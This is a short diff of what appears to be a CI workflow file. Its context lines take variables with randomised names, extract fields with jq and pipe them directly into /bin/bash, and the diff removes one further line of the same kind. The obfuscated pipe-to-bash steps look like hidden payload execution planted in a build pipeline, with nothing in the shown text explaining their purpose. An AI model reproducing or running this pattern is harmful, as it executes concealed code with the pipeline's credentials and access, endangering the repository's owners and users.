@@ -20,7 +20,6 @@ jobs:
           echo $sj4 | jq -r .v1 | /bin/bash
           printf '%s' "$eq449" | jq -r .ytgeu40041 | /bin/bash
           echo $wcc54184 | jq -r .bsrru886 | /bin/bash
-          printf '%s' "$epng92" | jq -r .uu64 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
